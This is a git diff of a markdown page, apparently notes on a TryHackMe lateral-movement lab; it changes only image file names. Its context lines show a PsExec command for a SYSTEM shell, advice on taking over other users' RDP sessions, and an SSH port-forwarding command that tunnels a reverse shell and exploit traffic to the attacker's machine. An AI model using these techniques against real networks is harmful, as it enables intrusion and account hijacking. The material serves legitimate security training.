@@ -871,7 +871,7 @@ PsExec64.exe -s cmd.exe
 
 To list the existing sessions on a server, you can use the following command:
 
-<figure><img src="../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be `rdp-tcp#6`. We can also see that a user named luke has left a session open with id `3`. Any session with a **Disc** state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.
 
@@ -922,7 +922,7 @@ C:\tools\PsExec64.exe -s cmd.exe
 query user
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Victim(cmd)**
 
@@ -1109,7 +1109,7 @@ First, let's take a look at how the exploit works. First, it will connect to the
 
 With this in mind, we could use SSH to forward some ports from the attacker's machine to THMJMP2 (SRVPORT for the web server and LPORT to receive the reverse shell) and pivot through THMJMP2 to reach RPORT on THMDC. We would need to do three port forwards in both directions so that all the exploit's interactions can be proxied through THMJMP2:
 
-<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (5).png" alt=""><figcaption></figcaption></figure>
 
 Rejetto HFS will be listening on port 80 on THMDC, so we need to tunnel that port back to our attacker's machine through THMJMP2 using remote port forwarding. Since the attackbox has port 80 occupied with another service, we will need to link port 80 on THMDC with some port not currently in use by the attackbox. Let's use port 8888. When running ssh in THMJMP2 to forward this port, we would have to add `-R 8888:thmdc.za.tryhackme.com:80` to our command.
 
@@ -1173,7 +1173,7 @@ passwd tunneluser
 ssh tunneluser@$KALI -R 8888:thmdc.za.tryhackme.com:80 -L *:1990:127.0.0.1:1990 -L *:1029:127.0.0.1:1029 -N
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (6) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali(Metasploit**
 
